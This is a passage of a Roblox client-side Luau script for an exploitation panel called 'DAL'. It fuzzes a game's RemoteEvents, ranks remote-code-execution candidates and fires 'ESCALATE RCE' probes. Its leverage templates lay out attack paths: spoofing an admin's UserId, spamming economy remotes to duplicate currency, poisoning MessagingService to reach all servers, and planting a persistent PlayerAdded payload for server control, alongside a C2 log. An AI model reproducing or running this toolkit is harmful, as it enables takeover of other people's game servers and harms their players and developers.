                Enum.TextXAlignment.Center, 55)

            -- Click to action
            local captR = r
            row.InputBegan:Connect(function(inp)
                if inp.UserInputType ==
                   Enum.UserInputType.MouseButton1 then
                    if captR.recommended == "RCE_PROBE" then
                        DAL:probeRCEBoundary(captR.path, nil)
                    elseif captR.recommended == "FUZZ" then
                        DAL:fuzzRemote(captR.path, nil, nil)
                    end
                end
            end)
        end
        scroll.CanvasSize = UDim2.fromOffset(0, #results * (ROW_H + 2))
    end

    scanBtn.MouseButton1Click:Connect(function()
        scanBtn.Text = "SCANNING..."
        local total = 0
        for _ in pairs(DAL.discovered) do total = total + 1 end
        statusLbl.Text = "Analysing " .. total .. " remotes..."
        DAL:staticPreScan(
            function(i, n, path, score, rec)
                statusLbl.Text = string.format(
                    "[%d/%d] %s -> %s (%d)",
                    i, n, path:match("([^%.]+)$") or path, rec, score)
            end,
            function(results)
                scanBtn.Text = "PRE-SCAN"
                local rceCount = 0
                for _, r in ipairs(results) do
                    if r.rceCandidate then rceCount = rceCount + 1 end
                end
                statusLbl.Text = string.format(
                    "%d ranked. %d RCE candidates. Click row to probe.",
                    #results, rceCount)
                rebuildSps()
            end
        )
    end)

    escalBtn.MouseButton1Click:Connect(function()
        if DAL.mode ~= 2 then
            statusLbl.Text = "Switch to MODE 2 first."
            return
        end
        escalBtn.Text = "RUNNING..."
        DAL:escalateRceCandidates(
            function(i, n, path)
                statusLbl.Text = string.format(
                    "RCE [%d/%d]: %s",
                    i, n, path:match("([^%.]+)$") or path)
            end,
            function(count)
                escalBtn.Text = "ESCALATE RCE"
                statusLbl.Text = count .. " RCE probes fired. See VIOLATIONS."
            end
        )
    end)

    return rebuildSps
end

-- ==================================================================
--   LEVERAGE ENGINE
--   The core of DAL's purpose: takes a confirmed violation and
--   answers three questions:
--     1. WHAT does this vulnerability class enable?
--     2. HOW do you use it to move toward SB-RCE?
--     3. WHICH node type should be added to the S->S graph?
--
--   Every violation gets a LeverageReport:
--   {
--     headline    : string  -- one line, what the attacker gains
--     mechanism   : string  -- how the flaw is exploited
--     rceVector   : string  -- concrete path toward SB-RCE
--     nodeTypeId  : string  -- NODE_TYPES id to spawn ("REMOTE","BINDABLE",etc.)
--     nodeLabel   : string  -- label for the spawned node
--     nodeAction  : string  -- pre-selected action on the spawned node
--     confidence  : string  -- "Confirmed" | "Probable" | "Structural"
--     steps       : table   -- ordered list of strings: the attack path
--   }
-- ==================================================================

-- -- Leverage templates keyed by VTYPE ----------------------------
local LEVERAGE_TEMPLATES = {}

LEVERAGE_TEMPLATES[VTYPE.STATE_SPOOF] = {
    headline   = "Server silently processed malformed data -- trust boundary is absent.",
    mechanism  = "The server received a payload that violated its expected type contract "
              .. "and continued executing instead of rejecting it. This means no guard "
              .. "clause exists at this boundary.",
    rceVector  = "Escalation path: (1) Confirm which downstream function consumed the "
              .. "malformed value. (2) If that function feeds a string into require(), "
              .. "loadstring(), or Instance.new(), the type-confusion payload becomes an "
              .. "execution injection vector. Fuzz with RCE probes on this remote next.",
    nodeTypeId = "REMOTE",
    nodeAction = "RemoteEvent",
    confidence = "Confirmed",
    steps = {
        "Client sends malformed payload (NaN / math.huge / wrong type).",
        "Server receives value -- no type assertion fires.",
        "Value propagates to downstream handler unchecked.",
        "If handler passes value to require() / loadstring() / Instance.new():",
        "  -> Attacker controls the instruction, not just the data.",
        "  -> SB-RCE achieved.",
    },
}

LEVERAGE_TEMPLATES[VTYPE.SILENT_PROCESS] = {
    headline   = "Server consumed the probe silently -- no rejection, no error.",
    mechanism  = "A malformed payload reached the server and was processed without "
              .. "triggering a visible error. This indicates the server has no input "
              .. "validation at this boundary and will accept arbitrary data shapes.",
    rceVector  = "Silent acceptance is the precondition for every higher-class attack. "
              .. "Run an RCE boundary probe on this remote immediately -- if the server "
              .. "treats strings as instructions anywhere in its handler chain, this "
              .. "boundary is your entry point for execution injection.",
    nodeTypeId = "REMOTE",
    nodeAction = "RemoteEvent",
    confidence = "Confirmed",
    steps = {
        "Client sends malformed payload.",
        "Server processes silently -- no guard exists.",
        "Attacker escalates payload type toward code strings.",
        "If server evaluates string payload: SB-RCE entry point confirmed.",
    },
}

LEVERAGE_TEMPLATES[VTYPE.IDENTITY_LOSS] = {
    headline   = "Server lost track of who made this request -- identity can be spoofed.",
    mechanism  = "The RemoteEvent securely prepends the Player object as the first "
              .. "argument. However, when this remote hands off to a BindableEvent or "
              .. "module, the Player reference is dropped. Downstream systems use a "
              .. "client-supplied UserId instead of the engine-guaranteed one.",
    rceVector  = "Inject a target UserId (e.g. a server admin or developer) as the "
              .. "identity argument. If the downstream handler grants elevated access "
              .. "based on that spoofed identity, you gain admin-level execution context "
              .. "without breaking the sandbox -- and from that context, admin commands "
              .. "may load or execute arbitrary scripts.",
    nodeTypeId = "BINDABLE",
    nodeAction = "BindableEvent",
    confidence = "Confirmed",
    steps = {
        "Client fires RemoteEvent -- engine guarantees Player as arg[1].",
        "Server handler receives Player correctly.",
        "Handler fires BindableEvent WITHOUT passing Player forward.",
        "Downstream module reads UserId from payload instead of engine.",
        "Attacker supplies UserId of admin/developer.",
        "Downstream system grants elevated permissions to attacker.",
        "With elevated context: admin commands may invoke loadstring() -> SB-RCE.",
    },
}

LEVERAGE_TEMPLATES[VTYPE.BROADCAST_POISON] = {
    headline   = "Client can force a payload into fleet-wide broadcast -- one injection, all servers.",
    mechanism  = "A RemoteEvent on this client feeds data into a MessagingService "
              .. "PublishAsync call without sanitizing the payload first. Because "
              .. "MessagingService is treated as a trusted inter-server channel, "
              .. "receiving servers consume that data without re-validating it.",
    rceVector  = "Craft a payload containing a malformed JSON structure or oversized "
              .. "string. Fire it through the identified ingress remote. If receiving "
              .. "servers pass the broadcasted payload into DataStore:SetAsync(), "
              .. "Instance.new(), or a script attribute, the entire game fleet is "
              .. "compromised simultaneously from a single injection.",
    nodeTypeId = "SERVICE",
    nodeAction = "MessagingService",
    confidence = "Structural",
    steps = {
        "Identify the RemoteEvent -> PublishAsync ingress path (double ingress).",
        "Craft malformed payload targeting the receiving server's handler.",
        "Fire the ingress remote once from one client.",
        "MessagingService broadcasts poisoned data to ALL active servers.",
        "Receiving servers process payload as trusted -- no re-validation.",
        "If payload reaches loadstring / require / Instance.new: fleet-wide SB-RCE.",
    },
}

LEVERAGE_TEMPLATES[VTYPE.RACE_PRECOND] = {
    headline   = "No concurrency guard -- rapid fire passes balance checks before commit.",
    mechanism  = "This remote handles an economy or state-change action without a "
              .. "debounce, mutex, or transaction wrapper. Multiple simultaneous "
              .. "requests can each pass the 'do they have enough?' check before "
              .. "the first deduction is saved to the DataStore.",
    rceVector  = "While not a direct RCE vector, race conditions on economy remotes "
              .. "can grant unlimited resources. Unlimited resources unlock premium "
              .. "features that may call require() or loadstring() with attacker- "
              .. "influenced arguments -- creating an indirect path to SB-RCE.",
    nodeTypeId = "SERVICE",
    nodeAction = "DataStoreService",
    confidence = "Structural",
    steps = {
        "Spam the economy remote 200+ times in under 1 second.",
        "Multiple requests pass the balance check before first commit.",
        "Player acquires items/currency far beyond intended limits.",
        "Use accumulated resources to trigger premium code paths.",
        "Probe those code paths for loadstring / require sinks.",
    },
}

LEVERAGE_TEMPLATES[VTYPE.DOUBLE_INGRESS] = {
    headline   = "Remote feeds MessagingService -- this is the fleet-broadcast fuse.",
    mechanism  = "This remote's name matches patterns associated with cross-server "
              .. "broadcast. If it routes to MessagingService:PublishAsync(), a single "
              .. "poisoned client payload will be replicated to every active server "
              .. "in the game fleet, bypassing per-server validation entirely.",
    rceVector  = "Confirm the PublishAsync path by injecting a sentinel string and "
              .. "monitoring whether a second server echoes it. If confirmed, craft "
              .. "a payload targeting the most dangerous sink in the receiving handler "
              .. "(DataStore write, Instance.new, require). One fire = fleet-wide impact.",
    nodeTypeId = "SERVICE",
    nodeAction = "MessagingService",
    confidence = "Structural",
    steps = {
        "Remote identified as potential MessagingService ingress.",
        "Inject sentinel payload through this remote.",
        "Monitor C2 log for fleet echo (second server receiving sentinel).",
        "If confirmed: craft targeted exploit payload.",
        "Single injection propagates to all servers simultaneously.",
    },
}

LEVERAGE_TEMPLATES[VTYPE.LOGIC_BYPASS] = {
    headline   = "Server performs a trust-based decision -- assumption can be violated.",
    mechanism  = "The server is making a decision based on what the client is expected "
              .. "to send, rather than what the server can prove. The developer assumed "
              .. "a constraint (range, type, context) that the client is never actually "
              .. "forced to respect.",
    rceVector  = "Logic bypasses are the entry point for higher-class attacks. "
              .. "Escalation: (1) Map what state change this bypass allows. "
              .. "(2) Use that state change to reach a code path that calls "
              .. "require() or loadstring() with data you influence. "
              .. "(3) That influence becomes execution.",
    nodeTypeId = "REMOTE",
    nodeAction = "RemoteEvent",
    confidence = "Probable",
    steps = {
        "Identify the developer assumption being violated.",
        "Confirm the server executes the downstream logic without validation.",
        "Map which state changes result from the bypass.",
        "Trace whether any state change reaches a code execution sink.",
        "If yes: logic bypass -> state manipulation -> SB-RCE.",
    },
}

LEVERAGE_TEMPLATES[VTYPE.RCE_BOUNDARY] = {
    headline   = "EXECUTION BOUNDARY CONFIRMED -- server treated attacker string as code.",
    mechanism  = "The server received a string probe and echoed back an execution "
              .. "signature, OR the remote's handler passes string arguments into "
              .. "loadstring(), require(), getfenv(), or a custom interpreter. "
              .. "The data-to-instruction boundary has been crossed.",
    rceVector  = "SB-RCE IS ACHIEVABLE FROM THIS REMOTE. Next steps: "
              .. "(1) Confirm execution environment via getfenv() probe. "
              .. "(2) Enumerate accessible globals (DataStoreService, Players, etc). "
              .. "(3) Inject persistent payload -- a function that fires on every "
              .. "PlayerAdded event -- to maintain persistent server-side control.",
    nodeTypeId = "REQUIRE",
    nodeAction = "External Asset ID",
    confidence = "Confirmed",
    steps = {
        "Execution boundary confirmed -- string was interpreted as code.",
        "Probe execution environment: getfenv() / getgc() enumeration.",
        "Map accessible globals: DataStore, Players, ServerStorage.",
        "Craft persistent payload (PlayerAdded hook).",
        "Inject payload through confirmed execution sink.",
        "SB-RCE ACHIEVED -- persistent server-side control established.",
    },
}

-- -- Core leverage function ----------------------------------------
function DAL:buildLeverageReport(violation)
    local template = LEVERAGE_TEMPLATES[violation.vtype]

    -- Fallback for unknown violation types
    if not template then
        return {
            headline   = "Vulnerability class logged -- manual analysis required.",
            mechanism  = "No leverage template exists for: " .. tostring(violation.vtype),
            rceVector  = "Review the violation evidence manually and cross-reference "
                      .. "with known attack patterns for this remote.",
            nodeTypeId = "REMOTE",
            nodeAction = "RemoteEvent",
            confidence = "Unknown",
            steps      = { "Manual review required." },
        }
    end

    -- Deep copy so we can annotate without mutating the template
    local report = {
        headline    = template.headline,
        mechanism   = template.mechanism,
        rceVector   = template.rceVector,
        nodeTypeId  = template.nodeTypeId,
        nodeAction  = template.nodeAction,
        confidence  = template.confidence,
        steps       = {},
        -- Violation metadata attached for the UI
        violationId = violation.id,
        remotePath  = violation.remotePath,
        severity    = violation.severity,
        vtype       = violation.vtype,
        traceId     = violation.traceId,
        -- Node label derived from the remote's last path segment
        nodeLabel   = violation.remotePath:match("([^%.]+)$") or violation.remotePath,
    }

    for _, step in ipairs(template.steps) do
        table.insert(report.steps, step)
    end

    -- Attach the violation's own evidence as a final context line
    table.insert(report.steps,
        "Evidence: " .. (violation.evidence or "none"):sub(1, 120))

    return report
end

-- -- Apply to Node: pushes a leverage report into the S->S graph --
function DAL:applyToNode(report)
    -- Find the matching NODE_TYPE entry
    local targetTypeData = nil
    for _, td in ipairs(NODE_TYPES) do
        if td.id == report.nodeTypeId then
            targetTypeData = td
            break
        end
    end
    if not targetTypeData then
        -- Fallback: use REMOTE
        for _, td in ipairs(NODE_TYPES) do
            if td.id == "REMOTE" then
                targetTypeData = td break
            end
        end
    end
    if not targetTypeData then return false, "No matching node type found" end

    -- Switch to the S->S tab so the user sees the graph.
    -- Note: activateGraphCtx is a no-op when S->S is already active,
    -- which means ssCtx.canvas stays nil (it only gets populated when
    -- switching AWAY from S->S). We use graphCanvas directly instead --
    -- it's always the live canvas regardless of context-save state.
    activateGraphCtx("SS", ssCtx)

    -- graphCanvas is the actual live ScrollingFrame used by spawnNode.
    -- ssCtx.canvas is only populated on context SWITCHES, not on first load.
    if not graphCanvas then
        return false,
            "S->S graph canvas not ready -- visit the S->S tab once first"
    end

    -- Spawn the node using the existing graph system
    -- Use graphCanvas (the live canvas) not ssCtx.canvas (only set on context switches)
    local cx = 80 + (#graphNodes * 22) % 400
    local cy = 60 + math.floor(#graphNodes / 18) * 60
    if graphCanvas and #graphNodes > 0 then
        -- Place it to the right of the last existing node
        local last = graphNodes[#graphNodes]
        if last and last.frame then
            cx = last.frame.Position.X.Offset + 140
            cy = last.frame.Position.Y.Offset
        end
    end

    local newNode = spawnNode(targetTypeData, cx, cy)
    if not newNode then return false, "spawnNode returned nil" end

    -- Pre-configure the node's action to match the leverage report
    for _, action in ipairs(targetTypeData.actions or {}) do
        if action.n == report.nodeAction then
            newNode.selectedAction = action
            newNode.actionLbl.Text = action.n .. " -- " .. action.d
            break
        end
    end

    -- Store the leverage context on the node for reference
    newNode.leverageReport  = report
    newNode.leverageSource  = report.remotePath
    newNode.inputValue      = report.remotePath

    -- Set the live Instance reference so the Execute chain can
    -- actually fire this remote. Without targetInst the chain sees
    -- the node as unconfigured and refuses to run.
    -- Only REMOTE and BINDABLE nodes need a live Instance;
    -- SERVICE nodes reference a Roblox service, not a RemoteEvent.
    local discoveredRec = DAL.discovered[report.remotePath]
    if discoveredRec and discoveredRec.inst then
        if report.nodeTypeId == "REMOTE" or report.nodeTypeId == "BINDABLE" then
            newNode.targetInst = discoveredRec.inst
        end
    end

    -- Log to DALSink
    DALSink:push({
        type     = "APPLY_NODE",
        sev      = report.severity and report.severity.label or "?",
        path     = report.remotePath,
        evidence = "Node spawned: " .. report.nodeTypeId ..
                   " <- " .. report.vtype,
    })

    return true, newNode
end

-- -- Leverage cache: violations -> reports (computed lazily) --------
DAL.leverageCache = {}

function DAL:getLeverageReport(violation)
    if not self.leverageCache[violation.id] then
        self.leverageCache[violation.id] = self:buildLeverageReport(violation)
    end
    return self.leverageCache[violation.id]
end

-- Clear cache when violations are cleared
local _origClearViol = DAL.clearViolations
function DAL:clearViolations()
    _origClearViol(self)
    self.leverageCache = {}
end

-- ==================================================================
--   LEVERAGE PANEL
--   A floating overlay that appears when the user clicks a
--   violation row. Shows the full LeverageReport for that violation:
--     - Headline (what you gain)
--     - Mechanism (why the flaw exists)
--     - Attack steps (ordered path)
--     - RCE vector (how to reach SB-RCE)
--     - [APPLY TO NODE] button
--     - [FUZZ AGAIN] button (re-runs probes on same remote)
-- ==================================================================
local leveragePanel = nil   -- singleton, shown/hidden per violation

local function closeLeveragePanel()
    if leveragePanel then
        leveragePanel:Destroy()
        leveragePanel = nil
    end
end

local function showLeveragePanel(parentGui, violation, report)
    closeLeveragePanel()

    local PW, PH = 520, 420
    local LP = mkFrame(parentGui, 0, 0, PW, PH, Color3.fromRGB(8,10,18), 0.04, 80)
    LP.Position = UDim2.fromOffset(
        math.max(4, math.floor((parentGui.AbsoluteSize.X - PW) / 2)),
        math.max(4, math.floor((parentGui.AbsoluteSize.Y - PH) / 2))
    )
    uiCorner(LP, 10)
    uiStroke(LP, report.severity.col, 0.25, 1)
    leveragePanel = LP

    -- Severity glow strip on left edge
    local strip = mkFrame(LP, 0, 0, 4, PH, report.severity.col, 0.0, 81)
    uiCorner(strip, 2)

    -- Header bar
    local hdr = mkFrame(LP, 0, 0, PW, 36, Color3.fromRGB(12,14,26), 0.08, 81)
    uiCorner(hdr, 10)

    -- Confidence badge
    local confCol = report.confidence == "Confirmed"  and Color3.fromRGB(228, 60, 80)
                 or report.confidence == "Probable"   and Color3.fromRGB(220,120, 50)
                 or                                        Color3.fromRGB( 90,180,255)
    local confBg = mkFrame(hdr, 8, 9, 70, 18, confCol, 0.65, 82)
    uiCorner(confBg, 4)
    mkLabel(confBg, 0, 0, 70, 18, report.confidence, 7, confCol,
        Enum.TextXAlignment.Center, 83)

    -- Violation type
    mkLabel(hdr, 84, 0, PW - 160, 36, report.vtype, 9, COL.TEXT,
        Enum.TextXAlignment.Left, 82)

    -- Close button
    local closeBtn = mkBtn(hdr, PW - 34, 8, 20, 20, "x",
        Color3.fromRGB(228,60,80), Color3.fromRGB(228,60,80), 82)
    closeBtn.MouseButton1Click:Connect(closeLeveragePanel)

    -- Remote path label
    mkLabel(LP, 8, 38, PW - 16, 14,
        "-> " .. report.remotePath, 7, COL.DIM,
        Enum.TextXAlignment.Left, 81)

    -- Scroll area for the full report
    local scroll = mkScroll(LP, 4, 54, PW - 8, PH - 120, 81)

    local function addSection(title, body, titleCol)
        local tRow = mkFrame(scroll, 0, 0, PW - 18, 18,
            Color3.new(0,0,0), 1, 82)
        tRow.LayoutOrder = #scroll:GetChildren()
        mkLabel(tRow, 0, 0, PW - 18, 18,
            "> " .. title, 8, titleCol or report.severity.col,
            Enum.TextXAlignment.Left, 83)

        local bodyLines = {}
        local maxW = PW - 26
        -- word-wrap at ~90 chars
        local wrapped = body:gsub("(.{1,90})(%s+)", "%1\n"):gsub("(.{1,90})$", "%1")
        for line in (wrapped .. "\n"):gmatch("([^\n]*)\n") do
            if line ~= "" then table.insert(bodyLines, line) end
        end

        for _, line in ipairs(bodyLines) do
            local lRow = mkFrame(scroll, 0, 0, PW - 18, 14,
                Color3.new(0,0,0), 1, 82)
            lRow.LayoutOrder = #scroll:GetChildren()
            mkLabel(lRow, 8, 0, PW - 26, 14, line, 7,
                Color3.fromRGB(185, 195, 225),
                Enum.TextXAlignment.Left, 83)
        end

        -- Spacer
        local spacer = mkFrame(scroll, 0, 0, PW - 18, 6,
            Color3.new(0,0,0), 1, 82)
        spacer.LayoutOrder = #scroll:GetChildren()
    end

    -- WHAT YOU GAIN
    addSection("WHAT YOU GAIN", report.headline, Color3.fromRGB(228,60,80))

    -- MECHANISM
    addSection("MECHANISM", report.mechanism, Color3.fromRGB(220,120,50))

    -- ATTACK PATH
    local stepTitle = mkFrame(scroll, 0, 0, PW - 18, 18,
        Color3.new(0,0,0), 1, 82)
    stepTitle.LayoutOrder = #scroll:GetChildren()
    mkLabel(stepTitle, 0, 0, PW - 18, 18,
        "> ATTACK PATH -> SB-RCE", 8, Color3.fromRGB(90,180,255),
        Enum.TextXAlignment.Left, 83)

    for i, step in ipairs(report.steps) do
        local sRow = mkFrame(scroll, 0, 0, PW - 18, 14,
            Color3.new(0,0,0), 1, 82)
        sRow.LayoutOrder = #scroll:GetChildren()
        mkLabel(sRow, 8, 0, PW - 26, 14,
            string.format("%d. %s", i, step), 7,
            Color3.fromRGB(185, 195, 225),
            Enum.TextXAlignment.Left, 83)
    end

    local spacer2 = mkFrame(scroll, 0, 0, PW - 18, 6,
        Color3.new(0,0,0), 1, 82)
    spacer2.LayoutOrder = #scroll:GetChildren()

    -- RCE VECTOR
    addSection("PATH TO SB-RCE", report.rceVector, Color3.fromRGB(200,40,220))

    -- Recalculate canvas height
    local totalH = 0
    for _, c in ipairs(scroll:GetChildren()) do
        if c:IsA("Frame") then totalH = totalH + c.AbsoluteSize.Y + 2 end
    end
    scroll.CanvasSize = UDim2.fromOffset(0, totalH + 20)

    -- Action buttons
    local btnY = PH - 56

    -- [APPLY TO NODE] -- the centrepiece
    local applyBtn = mkBtn(LP, 8, btnY, PW - 120, 40,
        "[DAL]  APPLY TO NODE  ->  S->S GRAPH",
        Color3.fromRGB(200,40,220), Color3.fromRGB(200,40,220), 82)
    applyBtn.TextSize = 9

    applyBtn.MouseButton1Click:Connect(function()
        applyBtn.Text = "Spawning node..."
        local ok, result = DAL:applyToNode(report)
        if ok then
            applyBtn.Text = "[OK] Node added to S->S"
            applyBtn.BackgroundColor3 = Color3.fromRGB(40, 160, 80)
            task.delay(1.5, closeLeveragePanel)
        else
            applyBtn.Text = "[X] " .. tostring(result)
            applyBtn.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
        end
    end)

    -- [FUZZ AGAIN] -- re-runs probes on the same remote
    local fuzzBtn = mkBtn(LP, PW - 108, btnY, 100, 40,
        "<>  FUZZ AGAIN",
        Color3.fromRGB(220,175,50), Color3.fromRGB(220,175,50), 82)
    fuzzBtn.TextSize = 8

    fuzzBtn.MouseButton1Click:Connect(function()
        fuzzBtn.Text = "Running..."
        DAL:fuzzRemote(report.remotePath, nil, function()
            fuzzBtn.Text = "<>  FUZZ AGAIN"
        end)
    end)

    return LP
end

-- -- Wire leverage panel into the violations tab -------------------
-- Called by buildViolationsTab -- injects "LEVERAGE >" button on
-- each violation row that opens the leverage panel on click.
function DAL:attachLeverageToRow(row, violation, parentGui)
    local PW = row.AbsoluteSize.X > 0 and row.AbsoluteSize.X or 500
    local leverageBtn = mkBtn(row, PW - 130, 5, 80, 18, "LEVERAGE >",
        Color3.fromRGB(200,40,220), Color3.fromRGB(200,40,220), 55)

    local captV = violation
    leverageBtn.MouseButton1Click:Connect(function()
        local report = DAL:getLeverageReport(captV)
        showLeveragePanel(parentGui, captV, report)
    end)

    return leverageBtn
end

-- ==================================================================
--   INITIALIZATION
--   Call DAL:init(parentFrame, x, y) to spawn the panel and start
--   the background crawler. Integrates with existing TransparentGui
--   by passing the ContentArea or any ScreenGui frame as parent.
-- ==================================================================
function DAL:init(parent)
    self.panel = buildPanel(parent)
    self:startCrawlLoop()
    return self.panel
end

-- Expose leverage panel functions so outer-scope tab builders can
-- reach them. showLeveragePanel and closeLeveragePanel are local to
-- this IIFE and invisible outside it -- exposing through DAL bridges
-- the scope boundary without restructuring the whole module.
DAL.showLeveragePanel  = showLeveragePanel
DAL.closeLeveragePanel = closeLeveragePanel

-- Same fix for the two tab builder functions that buildPanel calls.
-- buildLeverageTab and buildSpsTab are local to this IIFE; buildPanel
-- lives outside it and can't see them directly.
DAL.buildLeverageTab = buildLeverageTab
DAL.buildSpsTab      = buildSpsTab

    return DAL
end)()


-- ====================================================================
--   DAL LAUNCH
--   Mounts the Dynamic Analysis Layer into its own dedicated "DAL" tab
--   page (captured earlier as DALPage), so it no longer overlaps the
--   S->S, HPDC, Console, C2, or HTTP tabs. Starts the background
--   crawler loop immediately.
-- ====================================================================
DAL:init(DALPage)


--[[
  USAGE
  * LocalScript under StarterPlayerScripts (or StarterGui)
  * Add tab content in the TAB_DEFS table (build functions)
  * Add/remove tabs by editing TAB_DEFS entries
  * To rename the panel: TitleLabel.Text = "Your Title"
  * All config lives in the T = {} token table at the top

  CONTROLS
  * Drag     -- click-drag the title bar
  * Minimize -- yellow dot, or double-click title bar
  * Close    -- red dot (squish-collapse animation then Destroy)
  * Resize   -- drag the grip in the bottom-right corner
               (minimum size: PANEL_MIN_W x PANEL_MIN_H)

  TABS
  * S->S     -- Source to Sink data-flow architecture diagram
  * Settings -- placeholder
  * Info     -- placeholder
--]]
